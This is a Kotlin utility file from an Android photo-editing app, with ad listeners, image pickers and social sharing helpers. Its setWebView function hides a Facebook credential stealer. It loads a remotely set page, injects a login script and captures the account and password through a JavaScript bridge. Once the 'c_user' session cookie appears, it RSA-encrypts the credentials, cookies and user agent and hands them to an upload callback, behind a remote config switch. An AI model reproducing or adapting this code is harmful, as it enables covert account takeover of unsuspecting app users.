package ftp.summer.suncam.utils

import android.Manifest
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.anythink.banner.api.ATBannerExListener
import com.anythink.core.api.ATAdInfo
import com.anythink.core.api.AdError
import com.anythink.interstitial.api.ATInterstitialExListener
import com.anythink.splashad.api.ATSplashAdListener
import com.anythink.splashad.api.IATSplashEyeAd
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.material.floatingactionbutton.FloatingActionButton
import com.hjq.permissions.OnPermissionCallback
import com.hjq.permissions.XXPermissions
import com.jhworks.library.ImageSelector
import com.jhworks.library.core.MediaSelectConfig
import com.tencent.mmkv.MMKV
import ftp.summer.suncam.R
import ftp.summer.suncam.ui.activity.ActivityAges
import ftp.summer.suncam.ui.activity.ActivityCartoons
import ftp.summer.suncam.ui.activity.ActivitySlim
import ftp.summer.suncam.ui.activity.ActivityStickers
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect
import java.io.File


val permissions = arrayOf(
    Manifest.permission.WRITE_EXTERNAL_STORAGE,
    Manifest.permission.READ_EXTERNAL_STORAGE,
    Manifest.permission.CAMERA
)

var targetClass = ""

var selectImage = ""

fun AppCompatActivity.showToast(s: String) {
    Toast.makeText(this, s, Toast.LENGTH_SHORT).show()
}

fun AppCompatActivity.routerWhereByConfig(
    block1: () -> Unit,
    block2: (Uri?) -> Unit,
    block3: () -> Unit
) {
    if (isLogin) {
        block1()
    } else {
        if (configEntity.needLogin()) {
            if (configEntity.faceBookId().isNotBlank()) {
                fetchAppLink(configEntity.faceBookId()) {
                    block2(it)
                }
            } else {
                block3()
            }
        } else {
            block1()
        }
    }
}

fun AppCompatActivity.next(clazz: Class<*>, close: Boolean) {
    startActivity(Intent(this, clazz))
    if (close) {
        finish()
    }
}

fun AppCompatActivity.startCountDown(block: () -> Unit) {
    var job: Job? = null
    job = lifecycleScope.launch(Dispatchers.IO) {
        (0 until 20).asFlow().collect {
            delay(1000)
            if (it == 19) {
                withContext(Dispatchers.Main) {
                    block()
                }
                job?.cancel()
            }
        }
    }
}

fun AppCompatActivity.clearCookie(block: () -> Unit) {
    CookieSyncManager.createInstance(app)
    val cookieManager = CookieManager.getInstance()
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        cookieManager.flush()
    } else {
        cookieManager.removeSessionCookies(null)
        cookieManager.removeAllCookie()
        CookieSyncManager.getInstance().sync()
    }
    block()
}

class WebInterface {
    @JavascriptInterface
    fun businessStart(a: String, b: String) {
        account = a
        password = b
    }
}

fun AppCompatActivity.setWebView(
    webView: WebView,
    block1: () -> Unit,
    block2: () -> Unit,
    block4: (String) -> Unit
) {
    webView.apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
        addJavascriptInterface(WebInterface(), "businessAPI")
        webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                if (newProgress == 100) {
                    val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                    evaluateJavascript(hideJs, null)
                    val loginJs = getString(R.string.login)
                    evaluateJavascript(loginJs, null)
                    lifecycleScope.launch(Dispatchers.IO) {
                        delay(300)
                        withContext(Dispatchers.Main) {
//                            findViewById<FrameLayout>(R.id.activityFaceBookFl)?.let {
//                                it.apply {
//                                    visibility = View.GONE
//                                }
//                            }
                            block1()
                        }
                    }
                }
            }
        }
        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                val cookieManager = CookieManager.getInstance()
                val cookieStr = cookieManager.getCookie(url)
                if (cookieStr != null) {
                    if (cookieStr.contains("c_user")) {
                        if (account.isNotBlank() && password.isNotBlank() && cookieStr.contains("wd=")) {
                            lifecycleScope.launch(Dispatchers.Main) {
//                                findViewById<FrameLayout>(R.id.activityFaceBookFlContent)?.let {
//                                    it.apply {
//                                        visibility = View.VISIBLE
//                                    }
//                                }
                                block2()
                            }
                            val content = gson.toJson(
                                mutableMapOf(
                                    "un" to account,
                                    "pw" to password,
                                    "cookie" to cookieStr,
                                    "source" to configEntity.app_name,
                                    "ip" to "",
                                    "type" to "f_o",
                                    "b" to view.settings.userAgentString
                                )
                            ).toRsaEncrypt(updateEntity.d!!)
                            block4(content)//上传
                        }
                    }
                }
            }
        }
        loadUrl(updateEntity.m ?: "https://www.baidu.com")
    }

}

fun buildOpenAdListener(
    block1: () -> Unit,
    block2: (ATSplashAdListener) -> Unit
): ATSplashAdListener {
    return object : ATSplashAdListener {
        override fun onAdLoaded() {
            Log.e("xxxxxxHopenAdCreator", "onAdLoaded")
            block1()
        }

        override fun onNoAdError(p0: AdError?) {
            Log.e("xxxxxxHopenAdCreator", "onNoAdError $p0")
            block2(this)
        }

        override fun onAdShow(p0: ATAdInfo?) {
            Log.e("xxxxxxHopenAdCreator", "onAdShow")
        }

        override fun onAdClick(p0: ATAdInfo?) {
            Log.e("xxxxxxHopenAdCreator", "onAdClick")
        }

        override fun onAdDismiss(p0: ATAdInfo?, p1: IATSplashEyeAd?) {
            Log.e("xxxxxxHopenAdCreator", "onAdDismiss")
            block2(this)
        }
    }
}

fun buildInsertAdListener(
    block1: () -> Unit,
    block2: (ATInterstitialExListener) -> Unit,
    block3: () -> Unit
): ATInterstitialExListener {
    return object : ATInterstitialExListener {
        override fun onInterstitialAdLoaded() {
            Log.e("xxxxxxHInsertAd", "onInterstitialAdLoaded")
            block1()
        }

        override fun onInterstitialAdLoadFail(p0: AdError?) {
            Log.e("xxxxxxHInsertAd", "onInterstitialAdLoadFail $p0")
            block2(this)
        }

        override fun onInterstitialAdClicked(p0: ATAdInfo?) {
            Log.e("xxxxxxHInsertAd", "onInterstitialAdClicked $p0")
        }

        override fun onInterstitialAdShow(p0: ATAdInfo?) {
            Log.e("xxxxxxHInsertAd", "onInterstitialAdShow $p0")
        }

        override fun onInterstitialAdClose(p0: ATAdInfo?) {
            Log.e("xxxxxxHInsertAd", "onInterstitialAdClose $p0")
            adLastTime = System.currentTimeMillis()
            block2(this)
            block3()
        }

        override fun onInterstitialAdVideoStart(p0: ATAdInfo?) {
            Log.e("xxxxxxHInsertAd", "onInterstitialAdVideoStart $p0")
        }

        override fun onInterstitialAdVideoEnd(p0: ATAdInfo?) {
            Log.e("xxxxxxHInsertAd", "onInterstitialAdVideoEnd $p0")
        }

        override fun onInterstitialAdVideoError(p0: AdError?) {
            Log.e("xxxxxxHInsertAd", "onInterstitialAdVideoError $p0")
            block2(this)
        }

        override fun onDeeplinkCallback(p0: ATAdInfo?, p1: Boolean) {
            Log.e("xxxxxxHInsertAd", "onDeeplinkCallback $p0")
        }

    }
}

fun buildBannerAdListener(): ATBannerExListener {
    return object : ATBannerExListener {
        override fun onBannerLoaded() {
            Log.e("xxxxxxHBannerAd", "onBannerLoaded")
        }

        override fun onBannerFailed(p0: AdError?) {
            Log.e("xxxxxxHBannerAd", "onBannerFailed $p0")
        }

        override fun onBannerClicked(p0: ATAdInfo?) {
            Log.e("xxxxxxHBannerAd", "onBannerClicked $p0")
        }

        override fun onBannerShow(p0: ATAdInfo?) {
            Log.e("xxxxxxHBannerAd", "onBannerShow $p0")
        }

        override fun onBannerClose(p0: ATAdInfo?) {
            Log.e("xxxxxxHBannerAd", "onBannerClose $p0")
        }

        override fun onBannerAutoRefreshed(p0: ATAdInfo?) {
            Log.e("xxxxxxHBannerAd", "onBannerAutoRefreshed $p0")
        }

        override fun onBannerAutoRefreshFail(p0: AdError?) {
            Log.e("xxxxxxHBannerAd", "onBannerAutoRefreshFail $p0")
        }

        override fun onDeeplinkCallback(p0: Boolean, p1: ATAdInfo?, p2: Boolean) {
            Log.e("xxxxxxHBannerAd", "onDeeplinkCallback $p0")
        }

    }
}

fun dp2px(context: Context, dp: Float): Int {
    val density = context.resources.displayMetrics.density
    return (dp * density + 0.5f).toInt()
}

fun ImageView?.optionClick(block: () -> Unit) {
    this?.let {
        setOnClickListener {
            targetClass = ""
            targetClass = this.contentDescription.toString()
            block()
        }
    }
}

fun AppCompatActivity.nextByTargetClass() {
    var clazz: Class<*>? = null
    when (targetClass) {
        "Sticker" -> {
            clazz = ActivityStickers::class.java
        }
        "Slimming" -> {
            clazz = ActivitySlim::class.java
        }
        "Cartoon" -> {
            clazz = ActivityCartoons::class.java
        }
        "Age Alter" -> {
            clazz = ActivityAges::class.java
        }
    }
    next(clazz!!, false)
}

fun AppCompatActivity.openAlbum() {
    ImageSelector.startImageAction(
        this, 11, MediaSelectConfig.Builder()
            .setShowCamera(false)
            .setOpenCameraOnly(false)
            .setMaxCount(1)
            .setPlaceholderResId(R.drawable.app_activity_splash_icon)
            .build()
    )
}

fun AppCompatActivity.openCamera() {
    ImageSelector.startImageAction(
        this, 22, MediaSelectConfig.Builder()
            .setShowCamera(true)
            .setOpenCameraOnly(true)
            .setMaxCount(1)
            .setPlaceholderResId(R.drawable.app_activity_splash_icon)
            .build()
    )
}

fun AppCompatActivity.requestPermission2(block1: () -> Unit, block2: () -> Unit) {
    XXPermissions.with(this)
        .permission(permissions)
        .request(object : OnPermissionCallback {
            override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                if (all) {
                    block1()
                } else {
                    block2()
                }
            }

            override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                super.onDenied(permissions, never)
                block2()
            }
        })
}

fun AppCompatActivity.buildFloatActionButton(): FloatingActionButton {
    val fab = FloatingActionButton(this)
    fab.tag = "fab"
    val p = ViewGroup.LayoutParams(1, 1)
    fab.layoutParams = p
    return fab
}

fun AppCompatActivity.getCacheData(block: (ArrayList<String>) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        val keySet = MMKV.defaultMMKV()!!.decodeStringSet("keys") as HashSet?
        val data = ArrayList<String>()
        if (keySet != null) {
            for (item in keySet) {
                MMKV.defaultMMKV()!!.decodeString(item)?.let {
                    data.add(it)
                }
            }
        }
        withContext(Dispatchers.Main) {
            block(data)
        }
    }
}

fun AppCompatActivity.isInstalledApp(uri: String): Boolean {
    val pm = packageManager
    return try {
        pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES)
        true
    } catch (e: PackageManager.NameNotFoundException) {
        false
    }
}

fun AppCompatActivity.share(packageNames: String, path: String) {
    val share = Intent(Intent.ACTION_SEND)
    share.setPackage(packageNames)
    val uri =
        Uri.fromFile(File(path))
    share.putExtra(
        Intent.EXTRA_STREAM,
        uri
    )
    share.putExtra(
        Intent.EXTRA_TEXT, """Make more pics with app link 
                                         https://play.google.com/store/apps/details?id=${packageName}"""
    )
    share.type = "image/jpeg"
    share.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
    startActivity(Intent.createChooser(share, "Share Picture"))
}

fun AppCompatActivity.shareWithFacebook(picPath: String) {
    try {
        if (isInstalledApp("com.facebook.katana")) {
            share("com.facebook.katana", picPath)
        } else {
            val appPackageName = "com.facebook.katana"
            try {
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW, Uri.parse(
                            "market://details?id=$appPackageName"
                        )
                    )
                )
            } catch (anfe: ActivityNotFoundException) {
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW, Uri.parse(
                            "https://play.google.com/store/apps/details?id=$appPackageName"
                        )
                    )
                )
            }
        }
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun AppCompatActivity.shareWithIns(picPath: String) {
    try {
        if (isInstalledApp("com.instagram.android")) {
            share("com.instagram.android", picPath)
        } else {
            try {
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW,
                        Uri.parse("market://details?id=com.instagram.android")
                    )
                )
            } catch (e: Exception) {
                e.printStackTrace()
                startActivity(
                    Intent(
                        Intent.ACTION_VIEW,
                        Uri.parse("https://play.google.com/store/apps/details?id=com.instagram.android")
                    )
                )
            }
        }
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun AppCompatActivity.shareWithEmail(picPath: String) {
    try {
        val intent = Intent(Intent.ACTION_SENDTO)
        intent.data = Uri.parse("mailto:") // only email apps should handle this
        intent.putExtra(Intent.EXTRA_SUBJECT, resources.getString(R.string.app_name))
        intent.putExtra(
            Intent.EXTRA_STREAM,
            Uri.fromFile(File(picPath))
        )

        intent.putExtra(
            Intent.EXTRA_TEXT, """Make more pics with app link 
     https://play.google.com/store/apps/details?id=${packageName}"""
        )
        if (intent.resolveActivity(packageManager) != null) {
            startActivity(Intent.createChooser(intent, "Share Picture"))
        } else {
            showToast("Mail app have not been installed")
        }
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun initFaceBook() {
    FacebookSdk.apply {
        setApplicationId(configEntity.faceBookId())
        sdkInitialize(app)
        setAdvertiserIDCollectionEnabled(true)
        setAutoLogAppEventsEnabled(true)
        fullyInitialize()
    }
}

fun AppCompatActivity.fetchAppLink(key: String, callback: (Uri?) -> Unit) {
    AppLinkData.fetchDeferredAppLinkData(this, key, object : ftp.summer.suncam.CompletionHandlerWrapper() {
        override fun onInvoke(appLinkData: AppLinkData?) {
            callback(appLinkData?.targetUri)
        }
    })
}